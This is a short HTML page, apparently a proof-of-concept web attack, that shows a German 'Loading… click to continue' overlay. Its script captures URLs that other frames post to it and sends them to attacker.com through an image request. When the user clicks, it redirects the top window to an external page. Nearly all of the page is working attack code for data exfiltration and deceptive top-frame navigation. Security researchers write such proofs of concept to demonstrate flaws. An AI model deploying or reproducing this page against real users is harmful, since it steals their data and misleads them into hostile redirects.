<!DOCTYPE html>
<html>
<head>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body,html{width:100%;height:100%;overflow:hidden}
.overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;display:flex;align-items:center;justify-content:center;flex-direction:column;font-family:Arial,sans-serif;cursor:pointer}
.spinner{width:40px;height:40px;border:4px solid #ddd;border-top-color:#e31837;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:20px}
@keyframes spin{to{transform:rotate(360deg)}}
h2{color:#333;margin-bottom:10px}
p{color:#666;font-size:14px}
</style>
</head>
<body>
<div class="overlay" onclick="go()">
<div class="spinner"></div>
<h2>Laden...</h2>
<p>Klicken Sie hier, um fortzufahren</p>
</div>
<script>
// Capture leaked data
window.addEventListener('message',e=>{
    if(e.data&&e.data.href){
        new Image().src='https://attacker.com/r?u='+encodeURIComponent(e.data.href);
    }
});

function go(){
    // User clicked - now we can redirect top frame
    window.top.location.href = "https://jessisnofy-ai.github.io/mailxpert-poc/dae.html";
}
</script>
</body>
</html>
